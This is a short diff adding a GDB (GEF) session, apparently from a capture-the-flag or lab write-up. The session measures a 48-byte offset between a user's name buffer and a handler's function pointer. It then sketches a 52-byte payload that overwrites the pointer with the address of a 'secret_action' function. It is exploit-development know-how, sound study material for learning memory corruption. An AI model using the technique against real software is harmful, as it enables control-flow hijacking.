@@ -1,0 +1,20 @@
+gef➤ b foo
+gef➤ r
+gef➤ n
+gef➤ n
+gef➤  p secret_action 
+$1 = {void (void)} 0x565561f8 <secret_action>
+gef➤  p (void *)&(handler->action)
+$2 = (void *) 0x5655a210
+gef➤  p (void *)&(user->name)
+$3 = (void *) 0x5655a1e0
+gef➤  p (void *)&(user->name) - (void *)&(handler->action)
+$4 = 0xffffffd0
+gef➤  p (void *)&(handler->action) - (void *)&(user->name)
+$5 = 0x30
+gef➤  p/d (void *)&(handler->action) - (void *)&(user->name)
+$6 = 48
+gef➤  p/d (void *)&(handler->action) - (void *)&(user->name) + 4
+$7 = 52
+
+total size is 52 and first 48 are NOPs, whereas last 4 will overwrite the handler->action with the address of section_action
